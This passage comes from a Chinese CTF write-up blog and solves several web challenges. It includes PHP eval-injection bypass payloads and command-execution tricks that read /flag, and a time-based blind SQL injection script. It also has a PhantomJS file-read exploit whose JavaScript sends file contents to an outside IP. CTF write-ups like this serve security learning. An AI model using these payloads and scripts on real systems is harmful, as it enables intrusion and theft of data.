&quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;view_source&#x27;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function checkCookie($s) &#123;</span><br><span class="line">    $arr = explode(&#x27;:&#x27;, $s);</span><br><span class="line">    if ($arr[0] === &#x27;&#123;&quot;secret&quot;&#x27; &amp;&amp; preg_match(&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;, $arr[1]) &amp;&amp; count($arr) === 2 ) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ( !theFirstTimeSetCookie() ) setcookie(&#x27;secret&#x27;, &#x27;&#x27;, time()-1);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function haveFun($_f_g) &#123;</span><br><span class="line">    $_g_r = 32;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    for ($i = 0; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, 1);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; 0xC0);</span><br><span class="line">    &#125;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isset($_COOKIE[&#x27;secret&#x27;]) ? $json = $_COOKIE[&#x27;secret&#x27;] : setcookie(&#x27;secret&#x27;, &#x27;&#123;&quot;secret&quot;:&quot;&#x27; . strtoupper(md5(&#x27;y1ng&#x27;)) . &#x27;&quot;&#125;&#x27;, time()+7200 );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, true) : die(&#x27;no&#x27;);</span><br><span class="line"></span><br><span class="line">if ($obj &amp;&amp; isset($_GET[&#x27;give_me_shell&#x27;])) &#123;</span><br><span class="line">    ($obj[&#x27;secret&#x27;] != $flag_md5 ) ? haveFun($flag) : echo &quot;here is your webshell: $shell_path&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">die; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">checkCookie里面检查secret cookie的内容是否符合特定格式。它期望secret cookie包含一个以&#123;&quot;secret&quot;开头的JSON字符串，后跟一系列的双引号、数字或大写字母。如果格式正确，函数返回true；否则，它清除secret cookie并返回false。</span><br><span class="line"></span><br><span class="line">haveFun接受一个参数$_f_g，计算其MD5散列，转换为大写，然后遍历散列的每个字符，将每个字符的ASCII值与0xC0进行位与操作，并打印结果。</span><br><span class="line"></span><br><span class="line">如果$_COOKIE[&#x27;secret&#x27;]存在，其值被赋给$json；如果不存在，则创建一个新的secret cookie，其值为&#123;&quot;secret&quot;:&quot;加上&#x27;y1ng&#x27;的MD5散列的大写形式&quot;&#125;&#x27;，并设置其有效期为当前时间加7200秒（两小时）</span><br><span class="line"></span><br><span class="line">使用checkCookie函数验证$json。如果验证通过，$json被解码为一个数组并赋给$obj；如果失败，就终止脚本。</span><br><span class="line"></span><br><span class="line">如果$obj存在且$_GET[&#x27;give_me_shell&#x27;]被设置，脚本会检查$obj[&#x27;secret&#x27;]是否与$flag_md5相等。如果不等，调用haveFun($flag)；如果相等，输出一个字符串告知用户webshell的路径。</span><br><span class="line"></span><br><span class="line">step2：</span><br><span class="line">传入/?give_me_flag,回显了一串值是 0006464640064064646464006406464064640064006400000000000</span><br><span class="line">说明进入了havefun所以我们想要得到webshell路径可以尝试爆破找出那两个值相等的secret值，打开burp，看到115的值可以满足</span><br><span class="line">secret=&#123;&quot;secret&quot;:115&#125;进入之后他给了webshell路径 </span><br><span class="line">here is your webshell: w3b5HeLLlll123.php直接访问得到另一个源代码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//there are some secret waf that you will never know, fuzz me if you can</span><br><span class="line">require &quot;hidden_filter.php&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!$_SESSION[&#x27;login&#x27;])</span><br><span class="line">    die(&#x27;&lt;script&gt;location.href=\&#x27;./index.php\&#x27;&lt;/script&gt;&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        //清空session 从头再来</span><br><span class="line">        eval(&quot;\$_SESSION[&quot; . $code . &quot;]=false;&quot;); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span><br><span class="line">    &#125; else die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * When you feel that you are lost, do not give up, fight and move on.</span><br><span class="line"> * Being a hacker is not easy, it requires effort and sacrifice.</span><br><span class="line"> * But remember … we are legion!</span><br><span class="line"> *  ————Deep CTF 2020</span><br><span class="line">*/ </span><br><span class="line"></span><br><span class="line">在这个页面要传入的code参数，以及这里的$secret_waf我们不知道这段代码</span><br><span class="line">//there are some secret waf that you will never know, fuzz me if you can</span><br><span class="line">require &quot;hidden_filter.php&quot;;</span><br><span class="line">可以先fuzz一下看看过滤了什么</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">上面这些都被过滤了，然后我们现在的code在是在$_SESSION[&quot; . $code . &quot;]=false;里面,要逃出来，然后所以要先用]=1?&gt;把前面的闭合掉，然后执行我们读文件的代码，想用system什么的，但是()&quot;&quot;/什么的都被过滤了，注意这个代码上面有require &quot;hidden_filter.php&quot;;所以require可以帮我们读取文件，</span><br><span class="line">又因为fF被过滤了我们可以利用取反绕过</span><br><span class="line">payload:</span><br><span class="line">?code=]=1?&gt;&lt;?=require~%D0%99%93%9E%98%D1%8B%87%8B?&gt;</span><br><span class="line">又说在/flag里面</span><br><span class="line">?code=]=1?&gt;&lt;?=require~%D0%99%93%9E%98?&gt;</span><br><span class="line"></span><br><span class="line">还有个这里的]=1是为了防止语法错误</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="RemoteImageDownloader"><a href="#RemoteImageDownloader" class="headerlink" title="RemoteImageDownloader"></a>RemoteImageDownloader</h3><h4 id="考点：-13"><a href="#考点：-13" class="headerlink" title="考点："></a>考点：</h4><p><code> PhantomJS 到 2.1.1 有一个任意文件读取漏洞，如 file:// URI 的 XMLHttpRequest 所示。该漏洞存在于网页模块的 page.open() 函数中，该函数加载指定的 URL 并调用给定的回调。攻击者可以提供特制的 HTML 文件作为用户输入，允许读取文件系统上的任意文件。例如，如果 page.render() 是函数回调，则生成目标文件的 PDF 或图像。</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-17221、PhantomJS任意文件读取</span><br><span class="line">https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/（讲的很好）</span><br></pre></td></tr></table></figure>



<h4 id="解题过程：-28"><a href="#解题过程：-28" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">发现输入一个网址就会下载图片</span><br><span class="line">step2:</span><br><span class="line">看的wp，wp就是在云服务器上部署以下文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script src=&quot;http://123.58.209.80:8000/test.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function reqListener () &#123;</span><br><span class="line">    var encoded = encodeURI(this.responseText);</span><br><span class="line">    var b64 = btoa(this.responseText);</span><br><span class="line">    var raw = this.responseText;</span><br><span class="line">    document.write(&#x27;&lt;iframe src=&quot;http://123.58.209.80/exfil?data=&#x27;+b64+&#x27;&quot;&gt;&lt;/iframe&gt;&#x27;);</span><br><span class="line">&#125; </span><br><span class="line">var oReq = new XMLHttpRequest(); </span><br><span class="line">oReq.addEventListener(&quot;load&quot;, reqListener); </span><br><span class="line">oReq.open(&quot;GET&quot;, &quot;file:///flag&quot;); </span><br><span class="line">oReq.send();</span><br><span class="line">//从本地文件系统加载一个文件（file:///flag），然后将文件的内容以不同的格式（编码的URI字符串、Base64编码字符串和原始字符串）处理，并最终将Base64编码后的字符串通过一个iframe标签发送到一个远程服务器。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">或者可以用这个</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> x=new XMLHttpRequest;</span><br><span class="line"> x.onload=function()&#123;</span><br><span class="line"> document.write(this.responseText)</span><br><span class="line"> &#125;;</span><br><span class="line"> x.open(&quot;GET&quot;,&quot;file:///flag&quot;);</span><br><span class="line"> x.send();</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">部署完之后开启http服务得到一串base然后解密</span><br></pre></td></tr></table></figure>





<h2 id="代码审计-3"><a href="#代码审计-3" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="WUSTCTF-朴实无华-Revenge"><a href="#WUSTCTF-朴实无华-Revenge" class="headerlink" title="WUSTCTF_朴实无华_Revenge"></a>WUSTCTF_朴实无华_Revenge</h3><h4 id="考点：-14"><a href="#考点：-14" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">绕过</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-14"><a href="#解题过程-14" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line">function isPalindrome($str)&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=1;</span><br><span class="line">    $k=intval($len/2)+1;</span><br><span class="line">    for($j=0;$j&lt;$k;$j++)</span><br><span class="line">        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) &#123;</span><br><span class="line">            $l=0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    if ($l==1) return true;</span><br><span class="line">    else return false;</span><br><span class="line">&#125;//判断是否是回文，是回文返回true，不是返回false</span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    if (preg_match(&#x27;/[^0-9.-]/&#x27;, $num)) &#123;</span><br><span class="line">        die(&quot;非洲欢迎你1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //在64位系统中 intval()的上限不是2147483647 省省吧</span><br><span class="line">        die(&quot;非洲欢迎你2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">    $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">    if ($md5==md5(md5($md5)))</span><br><span class="line">        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">    else</span><br><span class="line">        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">去非洲吧</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">level 1要求必须是数字，范围在-999999999999999999到999999999999999999之间，并且num取反之后正反数据要一样且不是回文</span><br><span class="line">num=0.00就可以绕过</span><br><span class="line">leve 2 要求两次md5数据之后可以通过弱比较</span><br><span class="line">md5=0e1138100474</span><br><span class="line">level 3</span><br><span class="line">把大部分查看的命令给过滤了，在ls /的时候，发现空格也被过滤了用%09绕过</span><br><span class="line">get_flag=nl%09/flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="逐位法sql盲注"><a href="#逐位法sql盲注" class="headerlink" title="逐位法sql盲注"></a>逐位法sql盲注</h2><h3 id="Login-Only-For-36D"><a href="#Login-Only-For-36D" class="headerlink" title="Login_Only_For_36D"></a>Login_Only_For_36D</h3><h4 id="考点-16"><a href="#考点-16" class="headerlink" title="考点:"></a>考点:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql盲注</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-29"><a href="#解题过程：-29" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是一个sql注入，测试发现注入点在password那个位置</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuzz了一下发现这些被过滤了</span><br><span class="line">然后联合报错那些都不太行了，盲注的话，我这里用的大神的脚本</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time as t</span><br><span class="line">from urllib3.exceptions import InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">url = &#x27;https://3695ba6e-326b-4a8c-a5c2-69f11e94f5d8.challenge.ctf.show/index.php&#x27;</span><br><span class="line">list_char = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span><br><span class="line">passwd = &#x27;&#x27;</span><br><span class="line"># 没有回显，所以用时间盲注</span><br><span class="line"># select * from user where username=&#x27;admin\&#x27; and password=&#x27;or if((password regexp binary &quot;^passwd_part&quot;),sleep(3),1)#&#x27;</span><br><span class="line"># binary能够匹配大小写</span><br><span class="line">for i in range(16):</span><br><span class="line">    for char in list_char:</span><br><span class="line">        passwd_t = passwd + char</span><br><span class="line">        payload = &#x27;or/**/if((password/**/regexp/**/binary/**/&quot;^&#x27; + passwd_t + &#x27;&quot;),sleep(2),1)#&#x27;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: &#x27;admin\\&#x27;,</span><br><span class="line">            &#x27;password&#x27;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        start = int(t.time())</span><br><span class="line">        requests.post(url, data=data, verify=False)</span><br><span class="line">        end = int(t.time())</span><br><span class="line">        if end - start &gt;= 2:</span><br><span class="line">            passwd += char</span><br><span class="line">            print(passwd)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后这个脚本我看了下，他是尝试通过爆破密码的前一部分是否和admin的密码前一部分一样，一样的话服务器会延迟2秒，这种方法被称为逐位法</span><br><span class="line">得到密码：ILoVeThlrtySixD</span><br><span class="line">登录就拿到了。</span><br></pre></td></tr></table></figure>

<h2 id="RCE-4"><a href="#RCE-4" class="headerlink" title="RCE"></a>RCE</h2><h3 id="你取吧"><a href="#你取吧" class="headerlink" title="你取吧"></a>你取吧</h3><h4 id="知识点：-13"><a href="#知识点：-13" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用数组来绕过</span><br></pre></td></tr></table></figure>



<h4 id="解题过程：-30"><a href="#解题过程：-30" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$hint=file_get_contents(&#x27;php://filter/read=convert.base64-encode/resource=hhh.php&#x27;);</span><br><span class="line">$code=$_REQUEST[&#x27;code&#x27;];</span><br><span class="line">$_=array(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;\~&#x27;,&#x27;\^&#x27;);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line">foreach ($blacklist as $blacklisted) &#123;</span><br><span class="line">    if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $code)) &#123;</span><br><span class="line">        die(&#x27;nonono&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval(&quot;echo($code);&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">发现这里的26个字母被编成数组然后充当黑名单会被过滤掉，需要绕过这里，然后利用eval函数去rce</span><br><span class="line">法一：利用数组去绕过</span><br><span class="line">system=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11]</span><br><span class="line">ls=$_[13].$_[18]</span><br><span class="line">cat=$_[2].$_[0].$_[19]</span><br><span class="line">flag=$_[5].$_[13].$_[0].$_[6]</span><br><span class="line">system(&quot;cat /flag&quot;);</span><br><span class="line">1);$__=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___=$_[2].$_[0].$_[19].&#x27; &#x27;.&#x27;/&#x27;.$_[5].$_[13].$_[0].$_[6];$__($___);(1</span><br><span class="line">1)(1用来闭合echo,就可以拿到flag</span><br></pre></td></tr></table></figure>

<h2 id="代码审计-4"><a href="#代码审计-4" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="WUSTCTF-朴实无华-Revenge-Revenge"><a href="#WUSTCTF-朴实无华-Revenge-Revenge" class="headerlink" title="WUSTCTF_朴实无华_Revenge_Revenge"></a>WUSTCTF_朴实无华_Revenge_Revenge</h3><h4 id="考点：-15"><a href="#考点：-15" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">绕过</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-31"><a href="#解题过程：-31" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span 